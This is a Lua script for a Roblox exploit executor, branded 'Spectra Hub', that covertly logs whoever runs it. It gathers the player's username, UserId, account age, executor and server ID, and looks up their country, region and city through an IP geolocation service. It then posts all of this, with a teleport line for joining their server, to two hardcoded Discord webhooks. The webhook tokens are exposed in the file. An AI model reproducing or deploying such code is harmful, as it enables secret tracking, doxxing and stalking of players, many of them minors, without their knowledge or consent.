-- ts file was generated at discord.gg/25ms

local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")

local LocalPlayer = Players.LocalPlayer
local UserId = LocalPlayer.UserId
local JobId = game.JobId
local PlaceId = game.PlaceId
local Executor = identifyexecutor()

local TimeNow = os.date("%d/%m/%Y - %H:%M:%S")

local CountryName = "Unknown"
local RegionName = "Unknown"
local CityName = "Unknown"

-- Conta criada (idade em dias)
local AccountAgeDays = LocalPlayer.AccountAge

-- Nome real + display name formatado
local RealName = LocalPlayer.Name
local DisplayName = LocalPlayer.DisplayName
local FullName = RealName .. " [" .. DisplayName .. "]"

-- Pega localiza√ß√£o
pcall(function()
    local GeoResponse = http_request({
        Url = "http://ip-api.com/json/",
        Method = "GET"
    })

    local GeoData = HttpService:JSONDecode(GeoResponse.Body)

    if GeoData then
        CountryName = GeoData.country or "Unknown"
        RegionName = GeoData.regionName or "Unknown"
        CityName = GeoData.city or "Unknown"
    end
end)

-- WEBHOOKS
local MainWebhook = "https://discord.com/api/webhooks/1471212121126600776/DKiqQPzFwU1Wtz0wI3rjJTOVH2rYB0i0c6iG8rqx8nrI4BZh1sIZLptBUojmlf6IvYyP"
local LocationWebhook = "https://discord.com/api/webhooks/1472861973661093961/-rILYPRvJjSTe87PDuNj7Am7sJXRRZJUWbfTV8M2uZlyzyCsRYVUHj3NQWm_GGZ0Zvg4"

-- EMBED PRINCIPAL (TUDO)
local MainEmbed = HttpService:JSONEncode({
    embeds = {
        [1] = {
            color = 16711680, -- vermelho
            title = "Spectra Hub ‚Äî Script Executado",
            thumbnail = {
                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png",
            },
            fields = {
                [1] = {
                    name = "üë§ Username",
                    value = FullName,
                    inline = false
                },
                [2] = {
                    name = "üìÖ Account Age",
                    value = tostring(AccountAgeDays) .. " days",
                    inline = false
                },
                [3] = {
                    name = "üÜî UserId",
                    value = tostring(UserId),
                    inline = false
                },
                [4] = {
                    name = "üó∫Ô∏è Place",
                    value = MarketplaceService:GetProductInfo(PlaceId).Name,
                    inline = false
                },
                [5] = {
                    name = "üíª Executor",
                    value = Executor,
                    inline = false
                },
                [6] = {
                    name = "üîë Server ID",
                    value = JobId,
                    inline = false
                },
                [7] = {
                    name = "üïí Time",
                    value = TimeNow,
                    inline = false
                },
                [8] = {
                    name = "üåç Country",
                    value = CountryName,
                    inline = false
                },
                [9] = {
                    name = "üåÄ Teleport",
                    value = "lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. PlaceId .. ", '" .. JobId .. "', game.Players.LocalPlayer)\n",
                    inline = false
                },
            },
        },
    },
})

-- EMBED DE LOCALIZA√á√ÉO (S√ì REGION E CITY + USERNAME)
local LocationEmbed = HttpService:JSONEncode({
    embeds = {
        [1] = {
            color = 16711680, -- vermelho
            title = "Spectra Hub ‚Äî Localiza√ß√£o",
            thumbnail = {
                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png",
            },
            fields = {
                [1] = {
                    name = "üë§ Username",
                    value = FullName,
                    inline = false

                },
                [2] = {
                    name = "üÜî UserId",
                    value = tostring(UserId),
                    inline = false

                },
                [3] = {
                    name = "üåç Country",
                    value = CountryName,
                    inline = false

                },
                [4] = {
                    name = "üïí Time",
                    value = TimeNow,
                    inline = false

                },
                [5] = {
                    name = "üìå Region/State",
                    value = RegionName,
                    inline = false
                },
                [6] = {
                    name = "üìç City",
                    value = CityName,
                    inline = false
                },
            },
        },
    },
})

-- ENVIA WEBHOOK PRINCIPAL
pcall(function()
    http_request({
        Url = MainWebhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
        },
        Body = MainEmbed,
    })
end)

-- ENVIA WEBHOOK DE LOCALIZA√á√ÉO
pcall(function()
    http_request({
        Url = LocationWebhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
        },
        Body = LocationEmbed,
    })
end)

print("Webhook principal enviado com sucesso!")
print("Webhook de localiza√ß√£o enviado com sucesso!")
